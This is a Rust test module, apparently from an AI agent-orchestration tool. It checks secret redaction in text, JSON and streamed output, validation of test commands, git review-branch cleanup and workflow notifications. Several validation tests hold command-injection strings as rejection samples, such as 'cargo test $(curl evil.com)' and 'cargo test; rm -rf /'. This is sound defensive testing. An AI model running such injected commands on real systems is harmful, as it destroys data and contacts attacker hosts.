    #[tokio::test]
    async fn stream_redactor_redacts_provider_assignment_split_across_chunks() {
        let secrets = Arc::new(RwLock::new(Vec::new()));
        let mut redactor = StreamRedactor::new(secrets);

        assert!(redactor
            .push_chunk(r#"OPENAI_API_KEY="sk-proj-abcdef"#)
            .await
            .is_none());

        let output = redactor
            .push_chunk(r#"ghijklmnopqrstuvwxyz1234567890" done"#)
            .await
            .expect("completed provider assignment should flush");
        assert_eq!(output, "OPENAI_API_KEY=[REDACTED] done");
    }

    // ── redact_patterns ───────────────────────────────────────────────────────

    #[test]
    fn api_key_pattern_is_redacted() {
        let input = "api_key=super-secret-value,other=123";
        let output = redact_patterns(input);
        assert!(
            !output.contains("super-secret-value"),
            "api_key value must be redacted; got: {output}"
        );
        assert!(output.contains("[REDACTED]"));
    }

    #[test]
    fn bearer_token_pattern_is_redacted() {
        let input = "Authorization: Bearer mysecrettoken123";
        let output = redact_patterns(input);
        assert!(
            !output.contains("mysecrettoken123"),
            "bearer token must be redacted"
        );
    }

    #[test]
    fn password_pattern_is_redacted() {
        // The regex matches `keyword:value` or `keyword=value` adjacently.
        // JSON format `"password": "v"` has a closing quote before `:`, breaking adjacency.
        // Use key=value format which the regex handles directly.
        let input = "password=hunter2 other=safe";
        let output = redact_patterns(input);
        assert!(
            !output.contains("hunter2"),
            "password value must be redacted; got: {output}"
        );
    }

    #[test]
    fn github_token_pattern_is_redacted() {
        let input = "token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij0123456789";
        let output = redact_patterns(input);
        assert!(!output.contains("ghp_"), "github token must be redacted");
    }

    #[test]
    fn provider_token_pattern_is_redacted() {
        let input = "token sk-proj-abcdefghijklmnopqrstuvwxyz1234567890";
        let output = redact_patterns(input);
        assert!(
            !output.contains("sk-proj-"),
            "provider token must be redacted"
        );
        assert!(output.contains("[REDACTED]"));
    }

    #[test]
    fn quoted_env_assignment_pattern_is_redacted() {
        let input = r#"ANTHROPIC_API_KEY="sk-ant-api03-abcdefghijklmnopqrstuvwxyz1234567890""#;
        let output = redact_patterns(input);
        assert_eq!(output, "ANTHROPIC_API_KEY=[REDACTED]");
    }

    #[test]
    fn non_sensitive_text_is_not_modified() {
        let input = "hello world, this is safe";
        let output = redact_patterns(input);
        assert_eq!(output, input);
    }

    // ── command validation ────────────────────────────────────────────────────

    #[test]
    fn test_command_validation_rejects_dollar_subshell() {
        let cmd = "cargo test $(curl evil.com)";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(has_invalid, "should reject $ character");
    }

    #[test]
    fn test_command_validation_rejects_backtick_subshell() {
        let cmd = "cargo test `curl evil.com`";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(has_invalid, "should reject backtick character");
    }

    #[test]
    fn test_command_validation_rejects_semicolon_injection() {
        let cmd = "cargo test; rm -rf /";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(has_invalid, "should reject semicolon");
    }

    #[test]
    fn test_command_validation_rejects_pipe_injection() {
        let cmd = "cargo test | curl evil.com";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(has_invalid, "should reject pipe character");
    }

    #[test]
    fn test_command_validation_accepts_normal_cargo_test() {
        let cmd = "cargo test --workspace";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(!has_invalid, "should accept normal cargo test command");
    }

    #[test]
    fn split_test_command_parses_safe_argv() {
        let (program, args) =
            split_test_command("cargo test --workspace --package pnevma-core").expect("parse");
        assert_eq!(program, "cargo");
        assert_eq!(
            args,
            vec!["test", "--workspace", "--package", "pnevma-core"]
        );
    }

    #[test]
    fn split_test_command_rejects_empty_input() {
        assert!(split_test_command("   ").is_err());
    }

    // ── redact_json_value ────────────────────────────────────────────────────

    #[test]
    fn json_string_secret_is_redacted() {
        let secret = "json-secret-xyz".to_string();
        let val = serde_json::json!({"key": "json-secret-xyz", "other": 42});
        let out = redact_json_value(val, std::slice::from_ref(&secret));
        let out_str = out.to_string();
        assert!(
            !out_str.contains(&secret),
            "secret must not appear in JSON output"
        );
    }

    #[test]
    fn json_nested_array_strings_are_redacted() {
        let secret = "nested-secret".to_string();
        let val = serde_json::json!(["nested-secret", "safe-value"]);
        let out = redact_json_value(val, std::slice::from_ref(&secret));
        let out_str = out.to_string();
        assert!(!out_str.contains(&secret));
    }

    #[test]
    fn json_sensitive_key_is_redacted_without_known_secret() {
        let val = serde_json::json!({
            "password": "hunter2",
            "token": "abc123",
            "safe": "hello"
        });
        let out = redact_json_value(val, &[]);
        assert_eq!(out["password"], "[REDACTED]");
        assert_eq!(out["token"], "[REDACTED]");
        assert_eq!(out["safe"], "hello");
    }

    #[test]
    fn json_nested_sensitive_key_is_redacted() {
        let val = serde_json::json!({
            "auth": {
                "Authorization": "Bearer live-token",
                "refresh_token": "refresh-me"
            }
        });
        let out = redact_json_value(val, &[]);
        assert_eq!(out["auth"]["Authorization"], "[REDACTED]");
        assert_eq!(out["auth"]["refresh_token"], "[REDACTED]");
    }

    #[test]
    fn project_log_redaction_uses_registered_secret_values() {
        let project_id = Uuid::new_v4();
        let secret = "project-secret-value".to_string();
        register_project_redaction_secrets(project_id, std::slice::from_ref(&secret));

        let out = redact_payload_for_project_log(
            project_id,
            serde_json::json!({"chunk": format!("token={secret}")}),
        );
        let out_str = out.to_string();
        assert!(!out_str.contains(&secret));
        assert!(out_str.contains("[REDACTED]"));

        clear_project_redaction_secrets(project_id);
    }

    #[test]
    fn project_log_redaction_catches_provider_tokens_without_registered_values() {
        let project_id = Uuid::new_v4();
        let out = redact_payload_for_project_log(
            project_id,
            serde_json::json!({
                "chunk": "OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"
            }),
        );
        let out_str = out.to_string();
        assert!(!out_str.contains("sk-proj-"));
        assert!(out_str.contains("[REDACTED]"));
    }

    // ── redaction e2e ────────────────────────────────────────────────────────

    /// End-to-end integration test: a realistic Anthropic API key is injected
    /// into all three redaction entry points (text, JSON payload, streaming
    /// chunked output) and must never survive in any output path.
    #[tokio::test]
    async fn redaction_e2e_secret_never_survives_any_output_path() {
        // A realistic Anthropic API key long enough to exercise pattern +
        // literal redaction.
        let secret =
            "sk-ant-api03-testredaction123456789012345678901234567890123456789012345678901234567890-AAAA"
                .to_string();

        // ── Path 1: plain-text redaction via redact_text ────────────────────
        let text_input = format!("connecting to provider with key={secret} and continuing work");
        let text_output = redact_text(&text_input, std::slice::from_ref(&secret));
        assert!(
            !text_output.contains(&secret),
            "text path: secret must not survive redact_text; got: {text_output}"
        );
        assert!(
            text_output.contains("[REDACTED]"),
            "text path: redacted marker must be present"
        );

        // ── Path 2: JSON event-payload redaction via redact_json_value ──────
        let json_payload = serde_json::json!({
            "event": "session_output",
            "chunk": format!("export ANTHROPIC_API_KEY=\"{secret}\""),
            "meta": {
                "nested": format!("token={secret}")
            }
        });
        let json_output = redact_json_value(json_payload, std::slice::from_ref(&secret));
        let json_str = json_output.to_string();
        assert!(
            !json_str.contains(&secret),
            "json path: secret must not survive redact_json_value; got: {json_str}"
        );
        assert!(
            json_str.contains("[REDACTED]"),
            "json path: redacted marker must be present"
        );

        // ── Path 3: streaming chunked output via StreamRedactor ─────────────
        // The secret is deliberately split across two chunks at an arbitrary
        // boundary to simulate real PTY output fragmentation.
        let secrets = Arc::new(RwLock::new(vec![secret.clone()]));
        let mut redactor = StreamRedactor::new(secrets);

        let split_point = 40;
        let (chunk_a, chunk_b) = secret.split_at(split_point);

        let first = redactor.push_chunk(&format!("output: {chunk_a}")).await;
        let second = redactor.push_chunk(&format!("{chunk_b} done\n")).await;
        let remainder = redactor.finish().await;

        // Collect all emitted fragments.
        let mut stream_output = String::new();
        if let Some(s) = first {
            stream_output.push_str(&s);
        }
        if let Some(s) = second {
            stream_output.push_str(&s);
        }
        if let Some(s) = remainder {
            stream_output.push_str(&s);
        }

        assert!(
            !stream_output.contains(&secret),
            "stream path: secret must not survive StreamRedactor; got: {stream_output}"
        );
        // The stream path may or may not emit a [REDACTED] marker depending on
        // buffering; the critical invariant is the secret's absence.
    }

    /// Variant: secret injected via environment-variable assignment pattern
    /// without being registered as a known secret — pattern-based redaction
    /// must still catch it across all three paths.
    #[tokio::test]
    async fn redaction_e2e_pattern_only_catches_unregistered_provider_key() {
        // Not registered as a known secret — relies purely on pattern matching.
        let unregistered_key =
            "sk-ant-api03-unregistered99887766554433221100aabbccddeeff00112233445566778899-ZZZZ"
                .to_string();

        // ── Path 1: text ────────────────────────────────────────────────────
        let text_output = redact_text(&format!("key={unregistered_key}"), &[]);
        assert!(
            !text_output.contains(&unregistered_key),
            "pattern-only text path: unregistered secret must be caught; got: {text_output}"
        );

        // ── Path 2: JSON payload ────────────────────────────────────────────
        let json_output = redact_json_value(
            serde_json::json!({
                "chunk": format!("ANTHROPIC_API_KEY=\"{unregistered_key}\"")
            }),
            &[],
        );
        let json_str = json_output.to_string();
        assert!(
            !json_str.contains(&unregistered_key),
            "pattern-only json path: unregistered secret must be caught; got: {json_str}"
        );

        // ── Path 3: streaming (split across chunks) ─────────────────────────
        let secrets = Arc::new(RwLock::new(Vec::<String>::new()));
        let mut redactor = StreamRedactor::new(secrets);

        let split_point = 30;
        let (chunk_a, chunk_b) = unregistered_key.split_at(split_point);

        let first = redactor.push_chunk(&format!("export KEY={chunk_a}")).await;
        let second = redactor.push_chunk(&format!("{chunk_b}\n")).await;
        let remainder = redactor.finish().await;

        let mut stream_output = String::new();
        if let Some(s) = first {
            stream_output.push_str(&s);
        }
        if let Some(s) = second {
            stream_output.push_str(&s);
        }
        if let Some(s) = remainder {
            stream_output.push_str(&s);
        }

        assert!(
            !stream_output.contains(&unregistered_key),
            "pattern-only stream path: unregistered secret must be caught; got: {stream_output}"
        );
    }

    #[tokio::test]
    async fn discover_markdown_files_ignores_missing_glob_parent() {
        let project_root =
            std::env::temp_dir().join(format!("pnevma-discover-markdown-{}", Uuid::new_v4()));
        tokio::fs::create_dir_all(&project_root)
            .await
            .expect("create temp project root");

        let files = discover_markdown_files(
            &[
                ".pnevma/rules/*.md".to_string(),
                ".pnevma/conventions/*.md".to_string(),
            ],
            &project_root,
        )
        .await
        .expect("missing scope dirs should not fail discovery");

        assert!(
            files.is_empty(),
            "missing scope dirs should produce no files"
        );

        let _ = tokio::fs::remove_dir_all(&project_root).await;
    }

    #[test]
    fn live_session_event_payload_uses_normalized_public_shape() {
        let row = SessionRow {
            id: Uuid::new_v4().to_string(),
            project_id: Uuid::new_v4().to_string(),
            name: "Terminal".to_string(),
            r#type: Some("terminal".to_string()),
            backend: "tmux_compat".to_string(),
            durability: "durable".to_string(),
            lifecycle_state: "attached".to_string(),
            status: "running".to_string(),
            pid: Some(42),
            cwd: "/tmp/project".to_string(),
            command: "zsh".to_string(),
            branch: Some("main".to_string()),
            worktree_id: Some(Uuid::new_v4().to_string()),
            connection_id: None,
            remote_session_id: None,
            controller_id: None,
            started_at: Utc::now(),
            last_heartbeat: Utc::now(),
            last_output_at: None,
            detached_at: None,
            last_error: None,
            restore_status: None,
            exit_code: None,
            ended_at: None,
        };

        let payload = session_row_to_event_payload(&row);

        assert_eq!(payload["id"], row.id);
        assert_eq!(payload["status"], "running");
        assert_eq!(payload["health"], "active");
        assert_eq!(payload["cwd"], row.cwd);
        assert!(payload.get("project_id").is_none());
        assert!(payload.get("branch").is_none());
        assert!(payload.get("worktree_id").is_none());
    }

    #[tokio::test]
    async fn prepare_task_branch_for_review_commits_changes_and_removes_transients() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let repo = tempdir.path();
        tokio::fs::write(repo.join("README.md"), "# test\n")
            .await
            .expect("seed readme");
        git(repo, &["init", "-b", "main"]).await;
        git(repo, &["add", "README.md"]).await;
        git_output_with_config(
            repo,
            &[
                ("user.name", "Tester"),
                ("user.email", "tester@example.com"),
            ],
            &["commit", "-m", "initial"],
        )
        .await
        .expect("initial commit");
        git(repo, &["checkout", "-b", "pnevma/test-task"]).await;

        tokio::fs::write(repo.join("README.md"), "# updated\n")
            .await
            .expect("update readme");
        tokio::fs::create_dir_all(repo.join(".pnevma/data"))
            .await
            .expect("create pnevma data");
        tokio::fs::write(repo.join(".pnevma/task-context.md"), "context")
            .await
            .expect("write task context");
        tokio::fs::write(repo.join("CLAUDE.md"), "generated context")
            .await
            .expect("write claude");

        let task_id = Uuid::new_v4();
        let result = prepare_task_branch_for_review(repo, task_id, "Update readme", "main")
            .await
            .expect("prepare branch");

        assert!(
            !repo.join("CLAUDE.md").exists(),
            "generated CLAUDE.md should be removed"
        );
        assert!(
            !repo.join(".pnevma/task-context.md").exists(),
            "task context should be removed from review branch"
        );
        assert!(
            !repo.join(".pnevma/data").exists(),
            "pnevma runtime data should be removed from review branch"
        );
        assert!(
            git(repo, &["status", "--porcelain"])
                .await
                .trim()
                .is_empty(),
            "review branch should be clean after auto-commit"
        );
        assert_eq!(
            git(repo, &["rev-list", "--count", "main..HEAD"])
                .await
                .trim(),
            "1"
        );
        assert!(result
            .commit_message
            .starts_with(&format!("task({}):", &task_id.to_string()[..8])));
        assert!(
            !result.commit_sha.trim().is_empty(),
            "auto-commit should produce a commit sha"
        );
    }

    #[tokio::test]
    async fn workflow_completion_creates_terminal_notification() {
        let db = open_test_db().await;
        let project_id = Uuid::new_v4();
        db.upsert_project(&project_id.to_string(), "test", "/tmp/test", None, None)
            .await
            .expect("seed project");

        let workflow_id = Uuid::new_v4().to_string();
        let now = Utc::now();
        db.create_workflow_instance(&WorkflowInstanceRow {
            id: workflow_id.clone(),
            project_id: project_id.to_string(),
            workflow_name: "release".to_string(),
            description: Some("Release workflow".to_string()),
            status: "Running".to_string(),
            created_at: now,
            updated_at: now,
            params_json: None,
            stage_results_json: None,
            expanded_steps_json: None,
        })
        .await
        .expect("create workflow instance");

        let task_id = Uuid::new_v4().to_string();
        db.create_task(&TaskRow {
            id: task_id.clone(),
            project_id: project_id.to_string(),
            title: "Ship release".to_string(),
            goal: "merge".to_string(),
            scope_json: "[]".to_string(),
            dependencies_json: "[]".to_string(),
            acceptance_json: "[]".to_string(),
            constraints_json: "[]".to_string(),
            priority: "P2".to_string(),
            status: "Done".to_string(),
            branch: None,
            worktree_id: None,
            handoff_summary: None,
            created_at: now,
            updated_at: now,
            auto_dispatch: false,
            agent_profile_override: None,
            execution_mode: Some("worktree".to_string()),
            timeout_minutes: None,
            max_retries: None,
            loop_iteration: 0,
            loop_context_json: None,
            forked_from_task_id: None,
            lineage_summary: None,
            lineage_depth: 0,
        })
        .await
        .expect("create task");
        db.add_workflow_task(&workflow_id, 0, 0, &task_id)
            .await
            .expect("link task");

        let emitter: Arc<dyn EventEmitter> = Arc::new(RecordingEmitter::new());
        check_workflow_completion(&db, &task_id, Some(&emitter)).await;

        let instance = db
            .get_workflow_instance(&workflow_id)
            .await
            .expect("workflow lookup")
            .expect("workflow exists");
        assert_eq!(instance.status, "Completed");

        let notifications = db
            .list_notifications(&project_id.to_string(), false)
            .await
            .expect("list notifications");
        assert_eq!(notifications.len(), 1);
        assert_eq!(notifications[0].title, "Workflow completed");
    }
}
